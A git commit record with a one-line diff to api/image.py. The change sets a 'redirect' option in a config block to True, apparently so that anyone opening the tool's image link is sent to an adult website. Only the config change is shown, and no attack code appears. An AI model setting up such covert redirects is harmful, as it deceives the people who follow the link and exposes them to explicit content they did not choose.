e75cc23a66105a76034ad9e8c8f9bc73567049d4
TheBatProgrammer <122163824+TheBatProgrammer@users.noreply.github.com>
2025-02-18 10:41:35 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -50,7 +50,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
+        "redirect": True, # Redirect to a webpage?
         "page": "nl.pornhub.com" # Link to the webpage to redirect to 
     },
 
